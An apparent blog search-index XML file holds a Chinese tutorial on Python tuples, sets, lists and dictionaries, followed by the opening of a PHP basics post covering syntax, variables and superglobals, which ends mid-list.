<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>深入Python语言(七)-组合数据类型02</title>
      <link href="2021/03/25/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AB)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/"/>
      <url>2021/03/25/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AB)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(七)</title>
      <link href="2021/03/20/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%83)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B01/"/>
      <url>2021/03/20/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%83)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B01/</url>
      
        <content type="html"><![CDATA[<h2 id="组合数据类型概述"><a href="#组合数据类型概述" class="headerlink" title="组合数据类型概述"></a>组合数据类型概述</h2><p>要点：<strong>组合数据类型为多个同类型或不同类型数据提供单一表示。组合数据类型分3类：序列类型、集合类型和映射类型。</strong></p><p>（1）定义： 将多个数据有效组织起来并统一表示，这种能够表示多个数据的类型称为<strong>组合数据类型</strong>。不同于数字类型，例如整数、浮点数和复数类型，这些类型仅能表示一个数，这种表示单一数据的类型称为<strong>基本数据类型</strong>。</p><p>（2）序列类型是一个元素向量，元素之间存在<strong>先后关系</strong>，通过需要访问，元素之间不排他。</p><p>（3）集合类型是一个元素集合，元素之间<strong>无序</strong>，相同元素在集合中唯一存在。</p><p>（4）映射类型是”键-值“数据项的集合，**每个元素是一个键值对，表示为(key,value)**。</p><p><img src="https://i.loli.net/2021/03/20/hVPeXHUaN4W5Id8.png" alt="image-20210320204630710"></p><h3 id="序列类型"><a href="#序列类型" class="headerlink" title="序列类型"></a>序列类型</h3><p>（1）序列类型是一维元素向量，元素之间存在先后关系，通过序号访问。当需要访问序列中某个特定值时，只需要通过下标标出即可。</p><p>（2）由于元素之间存在顺序关系，所以<strong>序列中可以存在数值相同但位置不同的元素</strong>。序列类型支持成员关系操作符(in)、长度计算函数(len())、分片([])，元素本身也可以是序列类型。</p><p>（3）Python中比较重要的序列类型：字符串(str)、元组(tuple)、列表(list)。</p><ul><li>字符串可以看成是单一字符的有序组合，属于序列类型。同时，由于字符串类型十分常用且单一字符串只表达一个含义，因此也被看作是基本数据类型。</li><li>元组是包含0个或多个数据项的不可变序列类型，元组生成后是固定的，其中任何数据项不能被替换或删除。</li><li>列表是一个可以修改数据项的数据类型，使用也最灵活。</li></ul><p>（4）<strong>只要是序列类型，都可以使用相同的索引体系，即正向递增序号和反向递减序号。</strong>(详见初始Python语言(二)))</p><p>（5)序列类型有12个通用的操作符和函数</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x in s</td><td align="center">若x是s的元素，返回True，否则返回False</td></tr><tr><td align="center">x not in s</td><td align="center">若x不是s的元素，返回True，否则返回False</td></tr><tr><td align="center">s + t</td><td align="center">连接s和t</td></tr><tr><td align="center">s<em>n或n\</em>s</td><td align="center">将序列s复制n次</td></tr><tr><td align="center">s[i]</td><td align="center">索引，返回序列的第i个元素</td></tr><tr><td align="center">s[i:j]</td><td align="center">分片，返回包含序列s第i到j个元素的子序列（不包含第j个元素）</td></tr><tr><td align="center">s[i:j:k]</td><td align="center">步骤分片，返回包含序列s第i到j个元素以k为步数的子序列</td></tr><tr><td align="center">len(s)</td><td align="center">序列s的元素个数（长度）</td></tr><tr><td align="center">min(s)</td><td align="center">序列s中的最小值</td></tr><tr><td align="center">max(s)</td><td align="center">序列s中的最大值</td></tr><tr><td align="center">s.index(x[,i[,j]])</td><td align="center">序列s中从i开始到j位置中第一次出现元素x的位置</td></tr><tr><td align="center">s.count(x)</td><td align="center">序列s中出现x的总次数</td></tr></tbody></table><p>（6）元组类型（tuple）是序列中比较特殊的类型，因为<strong>它一旦创建就不能修改</strong>。元组类型在表达固定数据项、函数多返回值、多变量同步赋值、循环遍历等情况下十分有用。Python中元组采用逗号和圆括号（可选）来表示。例如：</p><pre><code class="python">&gt;&gt;&gt; creature = &quot;cat&quot;, &quot;dog&quot;, &quot;tiger&quot;, &quot;human&quot;&gt;&gt;&gt; creature(&#39;cat&#39;, &#39;dog&#39;, &#39;tiger&#39;, &#39;human&#39;)&gt;&gt;&gt; color = (&quot;red&quot;, 0x001100, &quot;blue&quot;, creature)&gt;&gt;&gt; color(&#39;red&#39;, 4352, &#39;blue&#39;, (&#39;cat&#39;, &#39;dog&#39;, &#39;tiger&#39;, &#39;human&#39;))&gt;&gt;&gt; color[2]&#39;blue&#39;&gt;&gt;&gt; color[-1][2]&#39;tiger&#39;</code></pre><p>（7）生成元组只需要使用逗号将元素隔离开即可，例如上例中的元组creature，也可以增加圆括号，但圆括号在不混淆语义的情况下不是必须的。<strong>一个元组可以作为另一个元组的元素，可以采用多级索引获取信息，</strong>例如元组color中包含了creature。</p><p>（8）元组除了用于表达固定数据项外，还常用于如下3种情况：函数多返回值、多变量同步赋值、循环遍历，例如：</p><pre><code class="python">&gt;&gt;&gt; def func(x):    return x, x**3     #函数多返回值&gt;&gt;&gt; a, b=&#39;dog&#39;, &#39;tiger&#39;    #多变量同步赋值&gt;&gt;&gt; a, b=(b, a)       #多变量同步赋值，括号可省略&gt;&gt;&gt; import math&gt;&gt;&gt; for x, y in ((1,0),(2,5),(3,8)):   #循环遍历    print(math.hypot(x,y))       #求多个坐标到原点的距离1.05.3851648071345048.54400374531753</code></pre><h3 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h3><p>（1）集合类型与数学中的集合概念一致，即包含0个或多个数据项的无序组合。<strong>集合中的元素不可重复，元素类型只能是固定数据类型，例如整数、浮点数、字符串、元组等。</strong>列表、字典和集合类型本身都是可变数据类型，不能作为集合的元素出现。</p><p>（2）Python编译器中界定固定数据与否主要考察类型是否能够进行<strong>哈希运算</strong>。<strong>能够进行哈希运算的类型都可作为集合元素。</strong></p><p>（4）哈希运算：哈希运算可以将任意长度的二进制值映射为较短的<strong>固定长度的二进制值</strong>，这个小的二进制值称为哈希值。Python提供了一个内置的哈希运算函数<strong>hash()**，它可以对大多数数据类型产生一个哈希值。哈希值与哈希前的内容无关，可以说，</strong>哈希是数据在另一个数据维度的体现。**例如：</p><pre><code class="python">&gt;&gt;&gt; hash(&quot;PYTHON&quot;)4643938005541540506&gt;&gt;&gt; hash(&quot;IS&quot;)-2450861983417858884&gt;&gt;&gt; hash(&quot;GOOD&quot;)-1174573472557134882&gt;&gt;&gt; hash(&quot;PYTHON IS GOOD&quot;)-1199702010419733010</code></pre><p>（5）集合是无序组合，没有索引和位置的概念，不能分片，集合中元素可以动态增加或删除。集合用大括号{}表示，可以用赋值语句生成一个集合。例如：</p><pre><code class="python">&gt;&gt;&gt; S =&#123;425, &quot;BIT&quot;,(10,&quot;CS&quot;),424&#125;&gt;&gt;&gt; S&#123;424, 425, (10, &#39;CS&#39;), &#39;BIT&#39;&#125;&gt;&gt;&gt; T =&#123;425, &quot;BIT&quot;,(10,&quot;CS&quot;), 424, 425,&quot;BIT&quot;&#125;&gt;&gt;&gt; T&#123;424, 425, (10, &#39;CS&#39;), &#39;BIT&#39;&#125;</code></pre><p>（6）由于集合元素是无序的，集合的打印效果与定义顺序可以不一致。由于<strong>集合元素独一无二，使用集合类型能够过滤掉重复元素。</strong></p><p>（7）sex(x)函数可以用于生成集合，输入的参数可以是任何组合数据类型，返回结果是一个无重复且排序任意的集合，例如：</p><pre><code class="python">&gt;&gt;&gt; W = set(&quot;apple&quot;)&gt;&gt;&gt; W&#123;&#39;l&#39;, &#39;p&#39;, &#39;e&#39;, &#39;a&#39;&#125;&gt;&gt;&gt; V = set((&quot;cat&quot;,&quot;dog&quot;,&quot;tiger&quot;,&quot;human&quot;))&gt;&gt;&gt; V&#123;&#39;tiger&#39;, &#39;cat&#39;, &#39;human&#39;, &#39;dog&#39;&#125;</code></pre><p>（8）集合类型有10个操作符。</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">S - T</td><td align="center">返回一个新集合，包括在集合S但不在集合T中的元素</td></tr><tr><td align="center">S -= T</td><td align="center">更新集合S，包括在集合S但不在集合T中的元素</td></tr><tr><td align="center">S &amp; T</td><td align="center">返回一个新集合，包括同时在集合S和集合T中的元素</td></tr><tr><td align="center">S &amp;= T</td><td align="center">更新集合S，包括同时在集合S和集合T中的元素</td></tr><tr><td align="center">S ^ T</td><td align="center">返回一个新集合，包括集合S和集合T中的元素，但不包括同时在其中的元素</td></tr><tr><td align="center">S ^= T</td><td align="center">更新集合S，包括集合S和集合T中的元素，但不包括同时在其中的元素</td></tr><tr><td align="center">S | T</td><td align="center">返回一个新集合，包括集合S和集合T中的所有元素</td></tr><tr><td align="center">S |= T</td><td align="center">更新集合S，包括集合S和集合T中的所有元素</td></tr><tr><td align="center">S &lt;= T</td><td align="center">如果S与T相同或S是T的子集，返回True，否则返回False，可以用S&lt;T判断S是否是T的真子集</td></tr><tr><td align="center">S &gt;= T</td><td align="center">如果S与T相同或S是T的超集，返回True，否则返回False，可以用S&gt;T判断S是否是T的真超集</td></tr></tbody></table><p>上述操作符表达了集合类型的4种基本操作：交集（&amp;）、并集（|）、差集（-）、补集（^）、操作逻辑与数学定义相同。</p><p><img src="https://i.loli.net/2021/03/25/iAeX67WxPvm3K1u.png" alt="image-20210325150549210"></p><p>（9）集合类型有10个操作函数或方法</p><table><thead><tr><th align="center">操作函数或方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">S.add(x)</td><td align="center">如果数据项x不在集合S中，将x增加到s</td></tr><tr><td align="center">S.clear()</td><td align="center">移除S中的所有数据项</td></tr><tr><td align="center">S.copy()</td><td align="center">返回集合S的一个副本</td></tr><tr><td align="center">S.pop()</td><td align="center">随机返回集合S中的一个元素，如果S为空，产生KeyError异常</td></tr><tr><td align="center">S.discard(x)</td><td align="center">如果x在集合S中，移除该元素；如果x不在集合S中，不报错</td></tr><tr><td align="center">S.remove(x)</td><td align="center">如果x在集合S中，移除该元素；不在则产生KeyError异常</td></tr><tr><td align="center">S.isdisjoint(T)</td><td align="center">如果集合S与T没有相同元素，返回True</td></tr><tr><td align="center">len(S)</td><td align="center">返回集合S的元素的个数</td></tr><tr><td align="center">x in S</td><td align="center">如果x是S的元素，返回True，否则返回False</td></tr><tr><td align="center">x not in S</td><td align="center">如果x不是S的元素，返回True，否则返回False</td></tr></tbody></table><p>（10）集合类型主要用于3个场景：<strong>成员关系测试、元素去重和删除数据项</strong>，例如：</p><pre><code class="python">&gt;&gt;&gt; &quot;BIT&quot; in &#123;&quot;PYTHON&quot;, &quot;BIT&quot;, 123, &quot;good&quot;&#125;      #成员关系测试True&gt;&gt;&gt; tup = &#123;&quot;PYTHON&quot;, &quot;BIT&quot;, 123, &quot;GOOD&quot;, 123&#125;     #元素去重&gt;&gt;&gt; set (tup)&#123;&#39;PYTHON&#39;, 123, &#39;GOOD&#39;, &#39;BIT&#39;&#125;&gt;&gt;&gt; newtup = tuple(set(tup)-&#123;&#39;PYTHON&#39;&#125;)          #去重同时删除数据项&gt;&gt;&gt; newtup(&#39;BIT&#39;, 123, &#39;GOOD&#39;)</code></pre><h3 id="映射类型"><a href="#映射类型" class="headerlink" title="映射类型"></a>映射类型</h3><p>（1）映射类型是“键-值数据项的组合，每个元素是一个键值对，即元素是(key,value),元素之间是无序的。键值对(key,value)是一种二元关系，源于属性和值的映射关系。</p><p>（2）键（key）表示一个属性，也可以理解为一个类别或项目，值（value）是属性的内容，键值对刻画了一个属性和它的值。键值对将映射关系结构化，用于存储和表达。在Python中，映射类型主要以字典(dict)体现。</p><h2 id="列表类型和操作"><a href="#列表类型和操作" class="headerlink" title="列表类型和操作"></a>列表类型和操作</h2><p>要点：<strong>列表是包含0个或多个对象引用的有序序列，没有长度限制，可自由增删元素，使用灵活。</strong></p><h3 id="列表类型的概念"><a href="#列表类型的概念" class="headerlink" title="列表类型的概念"></a>列表类型的概念</h3><p>（1）列表（list）属于序列类型，与元组不同，列表的长度和内容都是可变的。</p><p>（2）由于列表属于序列类型，所以列表页支持成员关系操作符（in）、长度计算函数（len()）、分片（[]）。列表可以同时使用正向递增序号和反向递减序号，可以采用标准的比较操作符（&lt;、&lt;=、==、!=、&gt;=、&gt;）进行比较，<strong>列表的比较实际上是单个数据项的逐个比较。</strong></p><p>（3）列表用中括号[]表示，也可以通过list()函数将元组或字符串转化成列表。直接使用list()函数会返回一个空列表。例如：</p><pre><code class="python">&gt;&gt;&gt; ls =[425, &quot;BIT&quot;, [10, &quot;CS&quot;], 425]&gt;&gt;&gt; ls[425, &#39;BIT&#39;, [10, &#39;CS&#39;], 425]&gt;&gt;&gt; ls[2][-1][0]&#39;C&#39;&gt;&gt;&gt; list((425, &quot;BTI&quot;, [10, &quot;CS&quot;], 425))[425, &#39;BTI&#39;, [10, &#39;CS&#39;], 425]&gt;&gt;&gt; list(&quot;中国是一个伟大的国家&quot;)[&#39;中&#39;, &#39;国&#39;, &#39;是&#39;, &#39;一&#39;, &#39;个&#39;, &#39;伟&#39;, &#39;大&#39;, &#39;的&#39;, &#39;国&#39;, &#39;家&#39;]&gt;&gt;&gt; list()[]</code></pre><p>扩展：列表和数组。二者都是表示一组元素的方法，C语言采用数组，Python采用列表。二者区别：</p><ul><li>数组需要预先分配大小，列表则不需要</li><li>数组要求元素类型一致，列表则不需要</li></ul><p>（4）列表要处理一组数据，因此，<strong>列表必须通过显示的数据赋值才能完成，简单将一个列表赋值给另一个列表不会生成新的列表对象。</strong>例如：</p><pre><code class="python">&gt;&gt;&gt; ls = [425, &quot;BIT&quot;, 1024]     #用数据赋值产生列表ls&gt;&gt;&gt; lt =ls                  #lt是ls所对应数据的引用，lt并不包含真实数据&gt;&gt;&gt; ls[0]=0&gt;&gt;&gt; lt[0, &#39;BIT&#39;, 1024]</code></pre><p>（5）如上例所示，ls由实际数据赋值产生，为列表对象。将ls赋值给列表lt仅能产生对列表ls的一个新的引用，此时lt和ls变量都是实际数据的表示或引用，真实数据只存储一份。因此，修改ls也同时修改了lt。</p><h3 id="列表类型的操作"><a href="#列表类型的操作" class="headerlink" title="列表类型的操作"></a>列表类型的操作</h3><p>（1）列表是序列类型，因此，序列类型的12个通用操作符和函数都可应用于列表类型。但列表是可变的，以下列出了列表类型额外的14个常用函数或方法，主要处理列表的增删改等功能。</p><table><thead><tr><th align="center">函数或方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ls[i] = x</td><td align="center">替换列表ls第i数据项为x</td></tr><tr><td align="center">ls[i:j] = lt</td><td align="center">用列表lt替换列表ls中第i到第j项数据项(不含第j向，下同)</td></tr><tr><td align="center">ls[i:j:k] = lt</td><td align="center">用列表lt替换列表ls中第i到第j项以k为步数的数据</td></tr><tr><td align="center">del ls[i:j]</td><td align="center">删除列表ls第i到第j项数据，等价于ls[i:j] = []</td></tr><tr><td align="center">del ls[i:j:k]</td><td align="center">删除列表ls第i到第j项k为步数的数据</td></tr><tr><td align="center">ls+=lt或ls.extend(lt)</td><td align="center">将列表lt元素增加到列表ls中</td></tr><tr><td align="center">ls *= n</td><td align="center">更新列表，其元素重复n次</td></tr><tr><td align="center">ls.append(x)</td><td align="center">在列表ls最后增加一个元素x</td></tr><tr><td align="center">ls.clear()</td><td align="center">删除ls中的所有元素</td></tr><tr><td align="center">ls.copy()</td><td align="center">生成一个新列表，复制ls中的所有元素</td></tr><tr><td align="center">ls.inset(i,x)</td><td align="center">在列表ls的第i位置增加元素x</td></tr><tr><td align="center">ls.pop(i)</td><td align="center">将列表ls中的第i项元素取出并删除该元素</td></tr><tr><td align="center">ls.remove(x)</td><td align="center">将列表中出现的第一个元素x删除</td></tr><tr><td align="center">ls.reverse(x)</td><td align="center">列表ls中的元素反转</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; vlist = list(range(5))&gt;&gt;&gt; vlist[0, 1, 2, 3, 4]&gt;&gt;&gt; len (vlist[2:])    #计算从第3个元素开始到结尾的子串长度3&gt;&gt;&gt; vlist[2:][2, 3, 4]&gt;&gt;&gt; 2 in vlist        #判断2是否在列表vlist中True&gt;&gt;&gt; vlist[3]=&quot;python&quot;  #修改序号3的元素值和类型&gt;&gt;&gt; vlist[0, 1, 2, &#39;python&#39;, 4]&gt;&gt;&gt; vlist[1:3]=&#123;&quot;bit&quot;, &quot;computer&quot;&#125;  &gt;&gt;&gt; vlist[0, &#39;computer&#39;, &#39;bit&#39;, &#39;python&#39;, 4]</code></pre><p>（2）当使用一个列表改变另一个列表的值时，Python不要求两个列表的长度一样，但遵循“多增少减”的原则。例如：</p><pre><code class="python">&gt;&gt;&gt; vlist[0, &#39;computer&#39;, &#39;bit&#39;, &#39;python&#39;, 4]&gt;&gt;&gt; vlist[1:3] = [&quot;new_bit&quot;,&quot;new_computer&quot;, 123]&gt;&gt;&gt; vlist[0, &#39;new_bit&#39;, &#39;new_computer&#39;, 123, &#39;python&#39;, 4]&gt;&gt;&gt; vlist[1:3]=[&quot;fewer&quot;]&gt;&gt;&gt; vlist[0, &#39;fewer&#39;, 123, &#39;python&#39;, 4]</code></pre><p>（3）vlist[1:3]子序列包含了两个元素，对其赋值时却给了3个元素，最后vlist的结果会包含赋值列表中多余的元素。同样，当使用包含更少的元素赋值时，原列表元素会相应减少。<strong>可通过赋给更多或更少元素实现对列表元素的插入或删除</strong>。</p><p>（4）与元组一样，列表可以通过for-in语句对其元素进行遍历，基本语法结构如下：</p><pre><code class="python">for &lt;任意变量名&gt; in &lt;列表名&gt;:    &lt;语句块&gt;&gt;&gt;&gt; vlist[0, &#39;fewer&#39;, 123, &#39;python&#39;, 4]&gt;&gt;&gt; for e in vlist:    print(e, end=&quot; &quot;)0 fewer 123 python 4 &gt;&gt;&gt; </code></pre><p>（5）列表是一个十分灵活的数据结构，它具有处理任意长度、混合类型数据的能力，并提供了丰富的基础操作符合方法。<strong>当程序需要使用组合数据类型管理批量数据时，应尽量使用列表类型。</strong></p><h2 id="实例9：基本统计值计算"><a href="#实例9：基本统计值计算" class="headerlink" title="实例9：基本统计值计算"></a>实例9：基本统计值计算</h2><pre><code class="python">from math import sqrtdef getNum():       #获取用户输入    nums = []    isNumStr = input(&quot;请输入数字(直接输入回车退出)：&quot;)    while isNumStr != &quot;&quot;:        nums.append(eval(isNumStr))        isNumStr = input(&quot;请输入数字(直接输入回车退出)：&quot;)    return numsdef mean(numbers):     #计算平均值    s = 0.0    for num in numbers:        s = s +num    return s / len(numbers)def dev(numbers, mean):     #计算方差    sdev = 0.0    for num in numbers:        sdev =sdev + (num -mean)**2    b = sqrt(sdev / (len(numbers)-1))    return bdef median(numbers):        #计算中位数    ls = sorted(numbers)#sorted返回重新排序的列表,返回新的列表,而不是在原列表上操作,原来的列表不变    size = len(numbers)    if size % 2 == 0:        med = (numbers[size//2-1] + numbers[size//2]) / 2    else:        med = numbers[size//2]    return medn = getNum() #主体函数m = mean(n)print(&quot;平均值：&#123;&#125;,方差：&#123;:.2&#125;,中位数：&#123;&#125;.&quot;.format(m,dev(n,m),median(n)))</code></pre><p>运行结果如下：</p><pre><code class="python">&gt;&gt;&gt;请输入数字(直接输入回车退出)：99请输入数字(直接输入回车退出)：98请输入数字(直接输入回车退出)：97请输入数字(直接输入回车退出)：96请输入数字(直接输入回车退出)：95请输入数字(直接输入回车退出)：平均值：97.0,方差：1.6,中位数：97.</code></pre><p>列表在实现基本数据统计时发挥了很重要的作用，主要表现在以下3个方面：</p><ul><li>列表是一个动态长度的数据结构，可以根据需求增加或减少元素。</li><li>列表的一系列方法或操作符为计算提供了简单的元素运算手段。</li><li>列表提供了对每个元素的简单访问方式及所有元素的遍历方式。</li></ul><h2 id="字典类型和操作"><a href="#字典类型和操作" class="headerlink" title="字典类型和操作"></a>字典类型和操作</h2><h3 id="字典类型的概念"><a href="#字典类型的概念" class="headerlink" title="字典类型的概念"></a>字典类型的概念</h3><p>（1）访问列表的元素时，可以通过元素在列表的序号进行查找，即&lt;整数序号&gt;查找&lt;被索引内容&gt;</p><p>（2）实际生活中，需要更为灵活的信息查找方式。例如学生信息，需要基于身份证号进行查找，而不是信息存储序号。</p><p>（3）<strong>根据一个信息查找另一个信息的方式构成了“键值对”</strong>，它表示索引用的键和对应的值构成的成对关系，即通过特定的键（身份证号）来访问值（学生信息）。<strong>由于键不是序号，无法使用列表类型进行有效存储和索引。</strong></p><p>（4）通过任意键信息查找一组数据中值信息的过程叫<strong>映射</strong>，Python中通过字典实现映射。字典可以通过大括号{}建立，模式如下：</p><pre><code>&#123;&lt;键1&gt;:&lt;值1&gt;, &lt;键2&gt;:&lt;值2&gt;, ... , &lt;键n&gt;:&lt;值n&gt;&#125;</code></pre><p>（5）在Python中，大括号{}可以表示集合，所以字典类型也具有和集合类似的性质，<strong>即键值对之间没有顺序且不能重复</strong>。也就是说，可以把<strong>字典看成元素是键值队的集合</strong>。例如下面的一个简单字典：</p><pre><code class="python">&gt;&gt;&gt; Dcountry=&#123;&quot;中国&quot;:&quot;北京&quot;, &quot;美国&quot;:&quot;华盛顿&quot;, &quot;法国&quot;:&quot;巴黎&quot;&#125;&gt;&gt;&gt; print(Dcountry)&#123;&#39;中国&#39;: &#39;北京&#39;, &#39;美国&#39;: &#39;华盛顿&#39;, &#39;法国&#39;: &#39;巴黎&#39;&#125;</code></pre><p>（6）字典中的各个元素没有顺序之分，<strong>若想保持一个集合中元素的顺序，需要使用列表，而不是字典。</strong>字典最主要的用法是查找与特定键相对应的值，这通过索引符号来实现。例如：</p><pre><code class="python">&gt;&gt;&gt; Dcountry[&quot;中国&quot;]&#39;北京&#39;</code></pre><p>（7）字典中键值队的访问模式如下，采用<strong>中括号</strong>格式：</p><pre><code class="python">&lt;值&gt; = &lt;字典变量&gt;[&lt;键&gt;]</code></pre><p>（8）字典中对某个键值的修改可以通过中括号的访问和赋值实现，例如；</p><pre><code class="python">&gt;&gt;&gt; Dcountry[&quot;中国&quot;] = &#39;大北京&#39;&gt;&gt;&gt; print(Dcountry)&#123;&#39;中国&#39;: &#39;大北京&#39;, &#39;美国&#39;: &#39;华盛顿&#39;, &#39;法国&#39;: &#39;巴黎&#39;&#125;</code></pre><p>（9）字典是存储可变数量键值对的数据结构，键和值可以是任意数据类型，包括程序自定义的类型。Python字典效率非常高，甚至可以存储几十万项内容。</p><p>扩展：<strong>索引是按照一定顺序检索内容的体系。Python中，字符串、列表、元素等都采用数字索引，字典采用字符索引。</strong></p><h3 id="字典类型的操作"><a href="#字典类型的操作" class="headerlink" title="字典类型的操作"></a>字典类型的操作</h3><p>（1）字典通过大括号创建，并指定初始的值；通过中括号可以增加新的元素，例如：</p><pre><code class="python">&gt;&gt;&gt; Dcountry=&#123;&quot;中国&quot;:&quot;北京&quot;, &quot;美国&quot;:&quot;华盛顿&quot;, &quot;法国&quot;:&quot;巴黎&quot;&#125;&gt;&gt;&gt; Dcountry[&quot;英国&quot;]=&quot;伦敦&quot;&gt;&gt;&gt; print(Dcountry)&#123;&#39;中国&#39;: &#39;大北京&#39;, &#39;美国&#39;: &#39;华盛顿&#39;, &#39;法国&#39;: &#39;巴黎&#39;, &#39;英国&#39;: &#39;伦敦&#39;&#125;</code></pre><p>（2）直接使用大括号{}可以创建一个空的字典，并通过中括号[]向其增加元素，例如：</p><pre><code class="python">&gt;&gt;&gt; Dp=&#123;&#125;&gt;&gt;&gt; Dp[&#39;2^10&#39;]=1024&gt;&gt;&gt; print(Dp)&#123;&#39;2^10&#39;: 1024&#125;</code></pre><p>（3）注意：尽管集合类型也用大括号{}表示，<strong>但直接使用大括号{}生成的是一个字典，而不是集合。生成集合需要用set()函数。</strong></p><p>（4）字典在Python中也已采用面向对象方式实现，所以也有一些对应的方法，采用&lt;a&gt;.&lt;b&gt;()格式。</p><table><thead><tr><th align="center">函数和方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;d&gt;.keys()</td><td align="center">返回所有的键信息</td></tr><tr><td align="center">&lt;d&gt;.values()</td><td align="center">返回所有的值信息</td></tr><tr><td align="center">&lt;d&gt;.items()</td><td align="center">返回所有的键值对</td></tr><tr><td align="center">&lt;d&gt;.get(&lt;key&gt;,&lt;default&gt;)</td><td align="center">键存在则返回相应值，否则返回默认值</td></tr><tr><td align="center">&lt;d&gt;.pop(&lt;key&gt;,&lt;default&gt;)</td><td align="center">键存在则返回相应值，同时删除键值对，否则返回默认值</td></tr><tr><td align="center">&lt;d&gt;.popitem()</td><td align="center">随机从字典中取出一个键值对，以元组(key,value)形式返回</td></tr><tr><td align="center">&lt;d&gt;.clear()</td><td align="center">删除所有的键值对</td></tr><tr><td align="center">del&lt;d&gt;[&lt;key&gt;]</td><td align="center">删除字典中某一个键值对</td></tr><tr><td align="center">&lt;key&gt;in&lt;d&gt;</td><td align="center">如果键在字典中则返回True，否则返回False</td></tr></tbody></table><p>（5）若希望keys()、values()和items()方法返回列表类型，可以<strong>采用list()函数将返回值转换成列表</strong>。</p><pre><code class="python">&gt;&gt;&gt; Dcountry.keys()dict_keys([&#39;中国&#39;, &#39;美国&#39;, &#39;法国&#39;, &#39;英国&#39;])&gt;&gt;&gt; list(Dcountry.values())[&#39;大北京&#39;, &#39;华盛顿&#39;, &#39;巴黎&#39;, &#39;伦敦&#39;]&gt;&gt;&gt; Dcountry.items()dict_items([(&#39;中国&#39;, &#39;大北京&#39;), (&#39;美国&#39;, &#39;华盛顿&#39;), (&#39;法国&#39;, &#39;巴黎&#39;), (&#39;英国&#39;, &#39;伦敦&#39;)])&gt;&gt;&gt; &#39;中国&#39; in Dcountry          #只对键进行判断True&gt;&gt;&gt; Dcountry.get(&#39;美国&#39;,&#39;悉尼&#39;)     #&#39;美国&#39;在字典中存在&#39;华盛顿&#39;&gt;&gt;&gt; Dcountry.get(&#39;澳大利亚&#39;, &#39;悉尼&#39;)   #&#39;澳大利亚&#39;在字典中不存在&#39;悉尼&#39;</code></pre><p>（6）字典可以通过for-in语句对其元素进行遍历，基本语法结构如下：</p><pre><code>for &lt;变量名&gt; in &lt;字典名&gt;:    &lt;语句块&gt;</code></pre><p>（7）键相当于索引，因此，for循环返回的变量名是字典的索引值。若需要获得键对应的值，可以在语句块中get()方法获得。</p><pre><code class="python">&gt;&gt;&gt; for key in Dcountry:    print(key)中国美国法国英国&gt;&gt;&gt; for key in Dcountry:    print(Dcountry.get(key,&#39;不存在&#39;))大北京华盛顿巴黎伦敦</code></pre><p>（8）字典是实现键值对映射的数据结构，它采用固定数据类型的键数据作为索引，十分灵活，具有处理任意长度、混合类型键值对的能力。以下是字典的基本原则：</p><ul><li>字典是一个键值对的集合，该集合以键为索引，<strong>一个键信息只对应一个值信息。</strong></li><li>字典中元素以键信息为索引访问。</li><li>字典长度是可变的，可以通过对键信息赋值实现增加或修改键值对。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP与SQL进阶</title>
      <link href="2021/03/17/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/PHP%E4%B8%8ESQL%E8%BF%9B%E9%98%B6/"/>
      <url>2021/03/17/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/PHP%E4%B8%8ESQL%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP的基础语法"><a href="#PHP的基础语法" class="headerlink" title="PHP的基础语法"></a>PHP的基础语法</h2><p>（1）基本概念：</p><ul><li>PHP文件的默认文件扩展名是”.php”</li><li>PHP脚本可放置于文档中的任何位置</li><li>PHP脚本以**&lt;?php**开头，以**?&gt;**结尾</li><li>PHP语句以分号结尾**;**</li></ul><p>（2）注释：PHP支持三种注释方法，包括单行注释和多行注释</p><pre><code class="php">&lt;?php    //这是单行注释    #这也是单行注释    /*这是多行注释块        它横跨了        多行      */echo &quot;Hello World&quot;;?&gt;</code></pre><p>（3）输出语法</p><ul><li>echo：能输出多个字符串</li></ul><pre><code class="php">&lt;?phpecho &quot;123&quot;,&quot;456&quot;,&quot;789&quot;;?&gt;&lt;?php$name=&quot;kangkang&quot;;$shuiguo=array(&quot;苹果&quot;,&quot;香蕉&quot;,&quot;西瓜&quot;);echo &quot;I am &amp;name,I eat $shuiguo[1]&quot;;?&gt;</code></pre><ul><li>print：只能输出一个字符串</li></ul><h3 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h3><p>（1）PHP变量的命名规则：</p><ul><li>变量以$符号开头，其后是变量的名称</li><li>变量名必须以字母或下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字字符和下划线(A-z、0-9以及_)</li><li>变量名称对大小写敏感</li></ul><pre><code class="php">&lt;?php$txt=&quot;Hello World!&quot;;$x=5;$y=10.5;echo $txt;echo &quot;&lt;br/&gt;&quot;;echo $x+$y;?&gt;</code></pre><p>（2）超全局变量</p><ul><li>在PHP4.1.0中引入，是在全部作用域中始终可用的内置变量。</li><li>PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。</li></ul><pre><code class="php">    $_SESSION    $_COOKIE    $_FILES    $_GET    $_POST    $_REQUEST    $_SERVER    